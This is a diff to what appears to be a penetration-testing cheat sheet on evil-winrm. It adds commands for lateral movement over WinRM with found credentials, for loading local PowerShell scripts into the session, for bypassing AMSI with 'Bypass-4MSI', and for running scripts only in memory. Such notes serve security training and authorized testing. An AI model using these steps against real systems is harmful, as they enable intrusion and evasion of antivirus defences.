@@ -6,13 +6,23 @@
 
 ## TIP: Use -S flag to enable SSL. Use this when the WinRM port is 5986 (Over HTTPS)
 
-### Do lateral movement via WinRM protocol using foudn credentials with evil-winrm
+### Do lateral movement via WinRM protocol using found credentials with evil-winrm
+
+### In your Evil-WinRM session, when authenticating you can use a folder from your local machine as a source to run powershell scripts
+
+    evil-winrm -i TARGET_IP -u USER -p PASSWORD -s /path/to/PowerSharpBinaries
+
+### Bypass AMSI using the command within the session:
+
+    Bypass-4MSI
+
+### Then you can run scripts from memory (DO NOT WRITE ON DISK!)
 
 ## Authentication Methods
 
 #### 1) Clear text Password
 
- - evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD
+     evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD
 
 #### 2) Certificate (.pfx file)
 
